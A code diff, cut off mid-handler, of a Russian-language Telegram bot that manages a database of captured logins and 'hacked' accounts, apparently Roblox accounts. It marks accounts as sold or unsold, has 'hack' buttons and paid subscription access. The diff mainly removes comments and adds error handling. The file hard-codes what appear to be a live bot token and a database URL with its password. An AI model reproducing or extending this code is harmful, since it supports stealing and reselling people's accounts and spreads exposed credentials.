@@ -9,50 +9,45 @@ import time
 from datetime import datetime, timedelta
 
 # === Основные настройки бота ===
-TOKEN = '8028944732:AAEICb55rLpVYfL9vDul5aYPf_E19SPjMlo'  # Токен бота от BotFather
-ADMIN_CHAT_ID = '6956377285'  # Chat ID создателя бота
-DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'  # URL базы данных
-SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')  # URL сайта, по умолчанию Render
+TOKEN = '8028944732:AAEICb55rLpVYfL9vDul5aYPf_E19SPjMlo'
+ADMIN_CHAT_ID = '6956377285'
+DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'
+SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')
 
-# === Инициализация Flask и Telebot ===
-app = Flask(__name__)  # Создаем приложение Flask для обработки вебхуков
-bot = telebot.TeleBot(TOKEN)  # Инициализируем бота с токеном
+app = Flask(__name__)
+bot = telebot.TeleBot(TOKEN)
 
-# === Глобальные переменные для состояния бота ===
-tech_break = None  # Время окончания техперерыва
-tech_reason = None  # Причина техперерыва
-processed_updates = set()  # Множество обработанных update_id для предотвращения дубликатов
-pending_hacked = {}  # Словарь для отслеживания процесса добавления в hacked
-pending_support = {}  # Словарь для отслеживания процесса отправки сообщений в support
+tech_break = None
+tech_reason = None
+processed_updates = set()
+pending_hacked = {}
+pending_support = {}
 
-# === Функция для получения текущего времени с учетом часового пояса ===
 def get_current_time():
     print("Получение текущего времени с учетом UTC+2")
-    current_time = datetime.now()  # Получаем текущее время в UTC
-    adjusted_time = current_time + timedelta(hours=2)  # Добавляем 2 часа для UTC+2
+    current_time = datetime.now()
+    adjusted_time = current_time + timedelta(hours=2)
     print(f"Текущее время: {adjusted_time}")
     return adjusted_time
 
-# === Функция для подключения к базе данных ===
 def get_db_connection():
     print("Попытка подключения к базе данных")
     try:
-        conn = psycopg2.connect(DATABASE_URL)  # Устанавливаем соединение с базой
+        conn = psycopg2.connect(DATABASE_URL)
         print("Подключение к БД успешно установлено")
         return conn
     except Exception as e:
         print(f"Ошибка подключения к БД: {e}")
         return None
 
-# === Инициализация базы данных ===
 def init_db():
     print("Инициализация базы данных")
-    conn = get_db_connection()  # Получаем соединение
+    conn = get_db_connection()
     if conn is None:
         print("Не удалось инициализировать БД - продолжаем без БД")
         return False
     try:
-        c = conn.cursor()  # Создаем курсор для выполнения запросов
+        c = conn.cursor()
         print("Создаем таблицу 'users', если она не существует")
         c.execute('''CREATE TABLE IF NOT EXISTS users 
                      (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
@@ -62,14 +57,14 @@ def init_db():
         print("Создаем таблицу 'hacked_accounts', если она не существует")
         c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                      (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
-        subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()  # Устанавливаем подписку на 10 лет для создателя
+        subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()
         print(f"Устанавливаем создателя для chat_id: {ADMIN_CHAT_ID}")
         c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                   "ON CONFLICT (chat_id) DO UPDATE SET prefix = EXCLUDED.prefix, subscription_end = EXCLUDED.subscription_end",
                   (ADMIN_CHAT_ID, "Создатель", subscription_end))
-        conn.commit()  # Подтверждаем изменения
+        conn.commit()
         print("Коммит изменений в базе данных")
-        conn.close()  # Закрываем соединение
+        conn.close()
         print("БД успешно инициализирована")
         return True
     except Exception as e:
@@ -77,19 +72,17 @@ def init_db():
         conn.close()
         return False
 
-# === Функция для поддержания активности на Render ===
 def keep_alive():
     print("Запуск функции keep_alive для поддержания активности")
     while True:
         try:
             print(f"Отправка GET-запроса на {SITE_URL}")
-            response = requests.get(SITE_URL)  # Пингуем сайт
+            response = requests.get(SITE_URL)
             print(f"🔁 Пинг: {response.status_code} - {response.text[:50]}")
         except Exception as e:
             print(f"Ошибка keep-alive: {e}")
-        time.sleep(60)  # Ждем 60 секунд перед следующим пингом
+        time.sleep(60)
 
-# === Функция для получения данных пользователя из БД ===
 def get_user(chat_id):
     print(f"Получение данных пользователя для chat_id: {chat_id}")
     conn = get_db_connection()
@@ -126,7 +119,6 @@ def get_user(chat_id):
         conn.close()
         return None
 
-# === Функция для сохранения пользователя в БД ===
 def save_user(chat_id, prefix, subscription_end=None):
     print(f"Сохранение пользователя {chat_id} с префиксом {prefix}")
     conn = get_db_connection()
@@ -149,7 +141,6 @@ def save_user(chat_id, prefix, subscription_end=None):
         print(f"Ошибка сохранения пользователя {chat_id}: {e}")
         conn.close()
 
-# === Функция для увеличения счетчика кликов на сайт ===
 def increment_site_clicks(chat_id):
     print(f"Увеличение счетчика кликов на сайт для {chat_id}")
     conn = get_db_connection()
@@ -167,7 +158,6 @@ def increment_site_clicks(chat_id):
         print(f"Ошибка увеличения кликов для {chat_id}: {e}")
         conn.close()
 
-# === Функция для увеличения счетчика просмотров паролей ===
 def increment_password_views(chat_id):
     print(f"Увеличение счетчика просмотров паролей для {chat_id}")
     conn = get_db_connection()
@@ -185,7 +175,6 @@ def increment_password_views(chat_id):
         print(f"Ошибка увеличения просмотров паролей для {chat_id}: {e}")
         conn.close()
 
-# === Функция для сохранения учетных данных ===
 def save_credentials(login, password):
     print(f"Сохранение учетных данных: login={login}, password={password}")
     conn = get_db_connection()
@@ -208,7 +197,6 @@ def save_credentials(login, password):
         conn.close()
         return False
 
-# === Функция для удаления учетных данных ===
 def delete_credentials(login):
     print(f"Удаление учетных данных для login: {login}")
     conn = get_db_connection()
@@ -228,7 +216,6 @@ def delete_credentials(login):
         conn.close()
         return False
 
-# === Функция для сохранения взломанного аккаунта ===
 def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
     print(f"Сохранение взломанного аккаунта: login={login}")
     conn = get_db_connection()
@@ -253,7 +240,6 @@ def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
         conn.close()
         return False
 
-# === Функция для удаления взломанного аккаунта ===
 def delete_hacked_account(login):
     print(f"Удаление взломанного аккаунта для login: {login}")
     conn = get_db_connection()
@@ -273,7 +259,6 @@ def delete_hacked_account(login):
         conn.close()
         return False
 
-# === Функция для получения списка учетных данных ===
 def get_credentials():
     print("Получение списка учетных данных")
     conn = get_db_connection()
@@ -293,7 +278,6 @@ def get_credentials():
         conn.close()
         return []
 
-# === Функция для получения списка взломанных аккаунтов ===
 def get_hacked_accounts():
     print("Получение списка взломанных аккаунтов")
     conn = get_db_connection()
@@ -313,7 +297,6 @@ def get_hacked_accounts():
         conn.close()
         return []
 
-# === Функция для получения списка всех пользователей ===
 def get_all_users():
     print("Получение списка всех пользователей")
     conn = get_db_connection()
@@ -333,7 +316,6 @@ def get_all_users():
         conn.close()
         return []
 
-# === Функция для форматирования времени с минутами ===
 def format_time_with_minutes(iso_time):
     print(f"Форматирование времени: {iso_time}")
     added_time = datetime.fromisoformat(iso_time)
@@ -343,7 +325,6 @@ def format_time_with_minutes(iso_time):
     print(f"Отформатированное время: {formatted_time}")
     return formatted_time
 
-# === Функция проверки доступа ===
 def check_access(chat_id, command):
     print(f"Проверка доступа для {chat_id} на команду {command}")
     global tech_break, tech_reason
@@ -377,7 +358,6 @@ def check_access(chat_id, command):
     print(f"Доступ разрешен для {chat_id} на {command}")
     return None
 
-# === Flask маршруты ===
 @app.route('/')
 def index():
     print("Обработка запроса на главную страницу")
@@ -433,7 +413,6 @@ def webhook():
         print(f"Ошибка в вебхуке: {e}")
         return 'OK', 200
 
-# === Обработчики команд бота ===
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     chat_id = str(message.chat.id)
@@ -441,10 +420,18 @@ def start_cmd(message):
     access = check_access(chat_id, 'start')
     if access:
         print(f"Доступ ограничен для /start: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+            print(f"Ответ на /start отправлен для {chat_id}")
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /start для {chat_id}: {e}")
         return
-    print(f"Отправка приветственного сообщения для {chat_id}")
-    bot.reply_to(message, "✨ Добро пожаловать!\nЯ бот для управления доступом и данными.\n📋 Используйте /menu для списка команд.")
+    try:
+        print(f"Отправка приветственного сообщения для {chat_id}")
+        bot.reply_to(message, "✨ Добро пожаловать!\nЯ бот для управления доступом и данными.\n📋 Используйте /menu для списка команд.")
+        print(f"Приветственное сообщение отправлено для {chat_id}")
+    except Exception as e:
+        print(f"Ошибка отправки приветственного сообщения для {chat_id}: {e}")
 
 @bot.message_handler(commands=['getchatid'])
 def getchatid_cmd(message):
@@ -453,13 +440,19 @@ def getchatid_cmd(message):
     access = check_access(chat_id, 'getchatid')
     if access:
         print(f"Доступ ограничен для /getchatid: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /getchatid для {chat_id}: {e}")
         return
     username = message.from_user.username or "Нет юзернейма"
     print(f"Получен юзернейм: {username}")
     response = f"👤 Ваш Chat ID: `{chat_id}`\nЮзернейм: @{username}"
-    bot.reply_to(message, response, parse_mode='Markdown')
-    print(f"Отправлен ответ на /getchatid для {chat_id}")
+    try:
+        bot.reply_to(message, response, parse_mode='Markdown')
+        print(f"Отправлен ответ на /getchatid для {chat_id}")
+    except Exception as e:
+        print(f"Ошибка отправки ответа на /getchatid для {chat_id}: {e}")
 
 @bot.message_handler(commands=['site'])
 def site_cmd(message):
@@ -468,14 +461,20 @@ def site_cmd(message):
     access = check_access(chat_id, 'site')
     if access:
         print(f"Доступ ограничен для /site: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /site для {chat_id}: {e}")
         return
     increment_site_clicks(chat_id)
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("🌐 Перейти на сайт", url=SITE_URL))
     print(f"Отправка ссылки на сайт для {chat_id}")
-    bot.reply_to(message, "🔗 Получите доступ к нашему сайту:", reply_markup=markup)
-    print(f"Ответ на /site отправлен для {chat_id}")
+    try:
+        bot.reply_to(message, "🔗 Получите доступ к нашему сайту:", reply_markup=markup)
+        print(f"Ответ на /site отправлен для {chat_id}")
+    except Exception as e:
+        print(f"Ошибка отправки ответа на /site для {chat_id}: {e}")
 
 @bot.message_handler(commands=['menu'])
 def menu_cmd(message):
@@ -484,14 +483,23 @@ def menu_cmd(message):
     access = check_access(chat_id, 'menu')
     if access:
         print(f"Доступ ограничен для /menu: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+            print(f"Ответ об ограничении доступа отправлен для {chat_id}")
+        except Exception as e:
+            print(f"Ошибка отправки сообщения об ограничении для /menu: {e}")
         return
     
     user = get_user(chat_id)
     if not user:
         print(f"Ошибка: пользователь {chat_id} не найден")
-        bot.reply_to(message, "❌ Ошибка: пользователь не найден!")
+        try:
+            bot.reply_to(message, "❌ Ошибка: пользователь не найден!")
+            print(f"Сообщение об ошибке отправлено для {chat_id}")
+        except Exception as e:
+            print(f"Ошибка отправки сообщения об ошибке для /menu: {e}")
         return
+    
     print(f"Пользователь {chat_id} найден: {user}")
     time_left = (user['subscription_end'] - get_current_time()).days if user['subscription_end'] else 0
     time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
@@ -529,9 +537,17 @@ def menu_cmd(message):
                     "/addcred <логин> <пароль> — добавить пароль\n" \
                     "/addhacked <логин> <пароль> — добавить взломанный аккаунт"
     
-    print(f"Отправка ответа на /menu для {chat_id}")
-    bot.reply_to(message, response, parse_mode='Markdown')
-    print(f"Ответ на /menu успешно отправлен для {chat_id}")
+    print(f"Подготовлен ответ для /menu: {response[:100]}...")  # Логируем часть ответа
+    try:
+        bot.reply_to(message, response, parse_mode='Markdown')
+        print(f"Ответ на /menu успешно отправлен для {chat_id}")
+    except Exception as e:
+        print(f"Ошибка отправки ответа на /menu для {chat_id}: {e}")
+        try:
+            bot.send_message(chat_id, "❌ Ошибка при отправке меню! Попробуйте позже.")
+            print(f"Отправлено сообщение об ошибке для {chat_id}")
+        except Exception as e2:
+            print(f"Не удалось отправить сообщение об ошибке для {chat_id}: {e2}")
 
 @bot.message_handler(commands=['support'])
 def support_cmd(message):
@@ -540,12 +556,18 @@ def support_cmd(message):
     access = check_access(chat_id, 'support')
     if access:
         print(f"Доступ ограничен для /support: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /support для {chat_id}: {e}")
         return
     print(f"Запрос описания проблемы для {chat_id}")
-    msg = bot.reply_to(message, "📩 Опишите проблему или баг, который вы нашли.\nСообщение будет отправлено создателю (@sacoectasy).")
-    pending_support[chat_id] = {'step': 'awaiting_message', 'message_id': msg.message_id}
-    print(f"Ожидание ввода сообщения от {chat_id}")
+    try:
+        msg = bot.reply_to(message, "📩 Опишите проблему или баг, который вы нашли.\nСообщение будет отправлено создателю (@sacoectasy).")
+        pending_support[chat_id] = {'step': 'awaiting_message', 'message_id': msg.message_id}
+        print(f"Ожидание ввода сообщения от {chat_id}")
+    except Exception as e:
+        print(f"Ошибка отправки запроса для /support для {chat_id}: {e}")
 
 @bot.message_handler(func=lambda message: str(message.chat.id) in pending_support)
 def handle_support_input(message):
@@ -560,11 +582,14 @@ def handle_support_input(message):
         support_message = message.text.strip()
         username = message.from_user.username or "Нет юзернейма"
         print(f"Получено сообщение от {chat_id}: {support_message}")
-        bot.send_message(ADMIN_CHAT_ID, f"📬 Сообщение от @{username} (ID: {chat_id}):\n\n{support_message}")
-        bot.reply_to(message, "✅ Ваше сообщение отправлено создателю (@sacoectasy)!")
-        print(f"Сообщение отправлено создателю от {chat_id}")
-        del pending_support[chat_id]
-        print(f"Процесс /support завершен для {chat_id}")
+        try:
+            bot.send_message(ADMIN_CHAT_ID, f"📬 Сообщение от @{username} (ID: {chat_id}):\n\n{support_message}")
+            bot.reply_to(message, "✅ Ваше сообщение отправлено создателю (@sacoectasy)!")
+            print(f"Сообщение отправлено создателю от {chat_id}")
+            del pending_support[chat_id]
+            print(f"Процесс /support завершен для {chat_id}")
+        except Exception as e:
+            print(f"Ошибка отправки сообщения для /support для {chat_id}: {e}")
 
 @bot.message_handler(commands=['techstop'])
 def techstop_cmd(message):
@@ -573,20 +598,29 @@ def techstop_cmd(message):
     access = check_access(chat_id, 'techstop')
     if access:
         print(f"Доступ ограничен для /techstop: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /techstop для {chat_id}: {e}")
         return
     global tech_break, tech_reason
     args = message.text.split(maxsplit=2)[1:] if len(message.text.split()) > 1 else []
     if len(args) < 2 or not args[0].isdigit():
         print("Неверный формат команды /techstop")
-        bot.reply_to(message, "❌ Формат: /techstop <минуты> <причина>\nПример: /techstop 30 Обновление")
+        try:
+            bot.reply_to(message, "❌ Формат: /techstop <минуты> <причина>\nПример: /techstop 30 Обновление")
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /techstop для {chat_id}: {e}")
         return
     minutes = int(args[0])
     reason = args[1]
     tech_break = get_current_time() + timedelta(minutes=minutes)
     tech_reason = reason
     print(f"Техперерыв установлен на {minutes} минут с причиной: {reason}")
-    bot.reply_to(message, f"⏳ Техперерыв на {minutes} мин установлен!\nОкончание: {tech_break.strftime('%H:%M')} (UTC+2)\nПричина: {reason}")
+    try:
+        bot.reply_to(message, f"⏳ Техперерыв на {minutes} мин установлен!\nОкончание: {tech_break.strftime('%H:%M')} (UTC+2)\nПричина: {reason}")
+    except Exception as e:
+        print(f"Ошибка отправки ответа на /techstop для {chat_id}: {e}")
 
 @bot.message_handler(commands=['techstopoff'])
 def techstopoff_cmd(message):
@@ -595,13 +629,19 @@ def techstopoff_cmd(message):
     access = check_access(chat_id, 'techstopoff')
     if access:
         print(f"Доступ ограничен для /techstopoff: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /techstopoff для {chat_id}: {e}")
         return
     global tech_break, tech_reason
     tech_break = None
     tech_reason = None
     print("Техперерыв отключен")
-    bot.reply_to(message, "✅ Техперерыв успешно отключен!")
+    try:
+        bot.reply_to(message, "✅ Техперерыв успешно отключен!")
+    except Exception as e:
+        print(f"Ошибка отправки ответа на /techstopoff для {chat_id}: {e}")
 
 @bot.message_handler(commands=['passwords'])
 def passwords_cmd(message):
@@ -610,13 +650,19 @@ def passwords_cmd(message):
     access = check_access(chat_id, 'passwords')
     if access:
         print(f"Доступ ограничен для /passwords: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /passwords для {chat_id}: {e}")
         return
     increment_password_views(chat_id)
     credentials = get_credentials()
     if not credentials:
         print("Список паролей пуст")
-        bot.reply_to(message, "📂 Список паролей пуст.\nДобавьте через /addcred <логин> <пароль>.")
+        try:
+            bot.reply_to(message, "📂 Список паролей пуст.\nДобавьте через /addcred <логин> <пароль>.")
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /passwords для {chat_id}: {e}")
         return
     print(f"Получен список учетных данных: {credentials}")
     for i, (login, password, added_time) in enumerate(credentials, 1):
@@ -628,7 +674,11 @@ def passwords_cmd(message):
             types.InlineKeyboardButton(f"🔓 Взломать #{i}", callback_data=f"hack_cred_{login}_{chat_id}")
         )
         print(f"Отправка сообщения для пароля #{i} для {chat_id}")
-        bot.send_message(chat_id, response, reply_markup=markup, parse_mode='Markdown')
+        try:
+            bot.send_message(chat_id, response, reply_markup=markup, parse_mode='Markdown')
+            print(f"Сообщение для пароля #{i} отправлено для {chat_id}")
+        except Exception as e:
+            print(f"Ошибка отправки сообщения для пароля #{i} для {chat_id}: {e}")
     print(f"Все пароли отправлены для {chat_id}")
 
 @bot.message_handler(commands=['hacked'])
@@ -638,7 +688,10 @@ def hacked_cmd(message):
     access = check_access(chat_id, 'hacked')
     if access:
         print(f"Доступ ограничен для /hacked: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /hacked для {chat_id}: {e}")
         return
     
     hacked_accounts = get_hacked_accounts()
@@ -647,7 +700,10 @@ def hacked_cmd(message):
         if get_user(chat_id)['prefix'] == 'Создатель':
             markup.add(types.InlineKeyboardButton("➕ Добавить аккаунт", callback_data="add_hacked"))
         print("Список взломанных аккаунтов пуст")
-        bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.\nДобавьте через /addhacked или кнопку ниже.", reply_markup=markup)
+        try:
+            bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.\nДобавьте через /addhacked или кнопку ниже.", reply_markup=markup)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /hacked для {chat_id}: {e}")
         return
     
     response = "🔓 **Взломанные аккаунты**:\n"
@@ -668,7 +724,11 @@ def hacked_cmd(message):
     if get_user(chat_id)['prefix'] == 'Создатель':
         markup.add(types.InlineKeyboardButton("➕ Добавить аккаунт", callback_data="add_hacked"))
     print(f"Отправка списка взломанных аккаунтов для {chat_id}")
-    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
+    try:
+        bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
+        print(f"Список взломанных аккаунтов отправлен для {chat_id}")
+    except Exception as e:
+        print(f"Ошибка отправки списка взломанных аккаунтов для {chat_id}: {e}")
 
 @bot.message_handler(commands=['addhacked'])
 def add_hacked_cmd(message):
@@ -677,12 +737,18 @@ def add_hacked_cmd(message):
     access = check_access(chat_id, 'hacked')
     if access:
         print(f"Доступ ограничен для /addhacked: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /addhacked для {chat_id}: {e}")
         return
     args = message.text.split()[1:] if len(message.text.split()) > 1 else []
     if len(args) != 2:
         print("Неверный формат команды /addhacked")
-        bot.reply_to(message, "❌ Формат: /addhacked <логин> <пароль>\nПример: /addhacked test test123")
+        try:
+            bot.reply_to(message, "❌ Формат: /addhacked <логин> <пароль>\nПример: /addhacked test test123")
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /addhacked для {chat_id}: {e}")
         return
     login, password = args[0], args[1]
     markup = types.InlineKeyboardMarkup()
@@ -691,7 +757,10 @@ def add_hacked_cmd(message):
         types.InlineKeyboardButton("📦 Не продан", callback_data=f"hack_{login}_{password}_Не продан_{chat_id}")
     )
     print(f"Запрос статуса для {login} от {chat_id}")
-    bot.reply_to(message, f"🔓 Укажите статус для `{login}`:", reply_markup=markup, parse_mode='Markdown')
+    try:
+        bot.reply_to(message, f"🔓 Укажите статус для `{login}`:", reply_markup=markup, parse_mode='Markdown')
+    except Exception as e:
+        print(f"Ошибка отправки запроса статуса для /addhacked для {chat_id}: {e}")
 
 @bot.message_handler(commands=['admin'])
 def admin_cmd(message):
@@ -700,13 +769,23 @@ def admin_cmd(message):
     access = check_access(chat_id, 'admin')
     if access:
         print(f"Доступ ограничен для /admin: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+            print(f"Сообщение об ограничении доступа отправлено для {chat_id}")
+        except Exception as e:
+            print(f"Ошибка отправки сообщения об ограничении для /admin: {e}")
         return
+    
     users = get_all_users()
     if not users:
         print("Список пользователей пуст")
-        bot.reply_to(message, "📂 Список пользователей пуст.")
+        try:
+            bot.reply_to(message, "📂 Список пользователей пуст.")
+            print(f"Сообщение о пустом списке отправлено для {chat_id}")
+        except Exception as e:
+            print(f"Ошибка отправки сообщения о пустом списке для {chat_id}: {e}")
         return
+    
     response = "👑 **Панель администратора**\n📋 Список пользователей:\n\n"
     print(f"Получен список пользователей: {users}")
     for chat_id_user, prefix, subscription_end, site_clicks, password_views in users:
@@ -725,9 +804,18 @@ def admin_cmd(message):
                      f"⏳ Подписка: {time_left} дней\n"
                      f"🌐 Кликов на сайт: {site_clicks or 0}\n"
                      f"🔑 Просмотров паролей: {password_views or 0}\n\n")
-    print(f"Отправка ответа на /admin для {chat_id}")
-    bot.reply_to(message, response, parse_mode='Markdown')
-    print(f"Ответ на /admin отправлен для {chat_id}")
+    
+    print(f"Подготовлен ответ для /admin: {response[:100]}...")  # Логируем часть ответа
+    try:
+        bot.reply_to(message, response, parse_mode='Markdown')
+        print(f"Ответ на /admin успешно отправлен для {chat_id}")
+    except Exception as e:
+        print(f"Ошибка отправки ответа на /admin для {chat_id}: {e}")
+        try:
+            bot.send_message(chat_id, "❌ Ошибка при отправке панели администратора! Попробуйте позже.")
+            print(f"Отправлено сообщение об ошибке для {chat_id}")
+        except Exception as e2:
+            print(f"Не удалось отправить сообщение об ошибке для {chat_id}: {e2}")
 
 @bot.message_handler(commands=['adprefix'])
 def adprefix_cmd(message):
@@ -736,22 +824,34 @@ def adprefix_cmd(message):
     access = check_access(chat_id, 'adprefix')
     if access:
         print(f"Доступ ограничен для /adprefix: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /adprefix для {chat_id}: {e}")
         return
     args = message.text.split()[1:] if len(message.text.split()) > 1 else []
     if len(args) < 3 or not args[2].isdigit():
         print("Неверный формат команды /adprefix")
-        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <префикс> <дни>\nПример: /adprefix 123456789 Админ 30")
+        try:
+            bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <префикс> <дни>\nПример: /adprefix 123456789 Админ 30")
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /adprefix для {chat_id}: {e}")
         return
     target_chat_id, prefix, days = args[0], args[1], int(args[2])
     if prefix not in ["Админ", "Пользователь"]:
         print(f"Недопустимый префикс: {prefix}")
-        bot.reply_to(message, "❌ Префикс должен быть: Админ или Пользователь!")
+        try:
+            bot.reply_to(message, "❌ Префикс должен быть: Админ или Пользователь!")
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /adprefix для {chat_id}: {e}")
         return
     subscription_end = get_current_time() + timedelta(days=days)
     save_user(target_chat_id, prefix, subscription_end)
     print(f"Префикс {prefix} выдан для {target_chat_id} на {days} дней")
-    bot.reply_to(message, f"✅ Пользователю `{target_chat_id}` выдан префикс `{prefix}` на {days} дней!", parse_mode='Markdown')
+    try:
+        bot.reply_to(message, f"✅ Пользователю `{target_chat_id}` выдан префикс `{prefix}` на {days} дней!", parse_mode='Markdown')
+    except Exception as e:
+        print(f"Ошибка отправки ответа на /adprefix для {chat_id}: {e}")
 
 @bot.message_handler(commands=['delprefix'])
 def delprefix_cmd(message):
@@ -760,17 +860,26 @@ def delprefix_cmd(message):
     access = check_access(chat_id, 'delprefix')
     if access:
         print(f"Доступ ограничен для /delprefix: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /delprefix для {chat_id}: {e}")
         return
     args = message.text.split()[1:] if len(message.text.split()) > 1 else []
     if not args:
         print("Неверный формат команды /delprefix")
-        bot.reply_to(message, "❌ Формат: /delprefix <chat_id>\nПример: /delprefix 123456789")
+        try:
+            bot.reply_to(message, "❌ Формат: /delprefix <chat_id>\nПример: /delprefix 123456789")
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /delprefix для {chat_id}: {e}")
         return
     target_chat_id = args[0]
     save_user(target_chat_id, "Посетитель", get_current_time())
     print(f"Префикс сброшен для {target_chat_id}")
-    bot.reply_to(message, f"✅ Префикс пользователя `{target_chat_id}` сброшен до `Посетитель`!", parse_mode='Markdown')
+    try:
+        bot.reply_to(message, f"✅ Префикс пользователя `{target_chat_id}` сброшен до `Посетитель`!", parse_mode='Markdown')
+    except Exception as e:
+        print(f"Ошибка отправки ответа на /delprefix для {chat_id}: {e}")
 
 @bot.message_handler(commands=['database'])
 def database_cmd(message):
@@ -779,7 +888,10 @@ def database_cmd(message):
     access = check_access(chat_id, 'database')
     if access:
         print(f"Доступ ограничен для /database: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /database для {chat_id}: {e}")
         return
     
     response = "📊 **Управление базой данных**\n\n"
@@ -817,7 +929,10 @@ def database_cmd(message):
         types.InlineKeyboardButton("👁 Просмотр", callback_data="db_view")
     )
     print(f"Отправка данных базы для {chat_id}")
-    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
+    try:
+        bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
+    except Exception as e:
+        print(f"Ошибка отправки ответа на /database для {chat_id}: {e}")
 
 @bot.message_handler(commands=['adduser'])
 def add_user_cmd(message):
@@ -826,18 +941,27 @@ def add_user_cmd(message):
     access = check_access(chat_id, 'database')
     if access:
         print(f"Доступ ограничен для /adduser: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /adduser для {chat_id}: {e}")
         return
     args = message.text.split()[1:] if len(message.text.split()) > 1 else []
     if len(args) != 3 or not args[2].isdigit():
         print("Неверный формат команды /adduser")
-        bot.reply_to(message, "❌ Формат: /adduser <chat_id> <префикс> <дни>\nПример: /adduser 123456789 Админ 30")
+        try:
+            bot.reply_to(message, "❌ Формат: /adduser <chat_id> <префикс> <дни>\nПример: /adduser 123456789 Админ 30")
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /adduser для {chat_id}: {e}")
         return
     target_chat_id, prefix, days = args[0], args[1], int(args[2])
     subscription_end = get_current_time() + timedelta(days=days)
     save_user(target_chat_id, prefix, subscription_end)
     print(f"Пользователь {target_chat_id} добавлен с префиксом {prefix} на {days} дней")
-    bot.reply_to(message, f"✅ Пользователь `{target_chat_id}` добавлен с префиксом `{prefix}` на {days} дней!", parse_mode='Markdown')
+    try:
+        bot.reply_to(message, f"✅ Пользователь `{target_chat_id}` добавлен с префиксом `{prefix}` на {days} дней!", parse_mode='Markdown')
+    except Exception as e:
+        print(f"Ошибка отправки ответа на /adduser для {chat_id}: {e}")
 
 @bot.message_handler(commands=['addcred'])
 def add_cred_cmd(message):
@@ -846,20 +970,32 @@ def add_cred_cmd(message):
     access = check_access(chat_id, 'database')
     if access:
         print(f"Доступ ограничен для /addcred: {access}")
-        bot.reply_to(message, access)
+        try:
+            bot.reply_to(message, access)
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /addcred для {chat_id}: {e}")
         return
     args = message.text.split()[1:] if len(message.text.split()) > 1 else []
     if len(args) != 2:
         print("Неверный формат команды /addcred")
-        bot.reply_to(message, "❌ Формат: /addcred <логин> <пароль>\nПример: /addcred test test123")
+        try:
+            bot.reply_to(message, "❌ Формат: /addcred <логин> <пароль>\nПример: /addcred test test123")
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /addcred для {chat_id}: {e}")
         return
     login, password = args[0], args[1]
     if save_credentials(login, password):
         print(f"Учетные данные добавлены: {login}")
-        bot.reply_to(message, f"✅ Логин `{login}` с паролем `{password}` добавлен!", parse_mode='Markdown')
+        try:
+            bot.reply_to(message, f"✅ Логин `{login}` с паролем `{password}` добавлен!", parse_mode='Markdown')
+        except Exception as e:
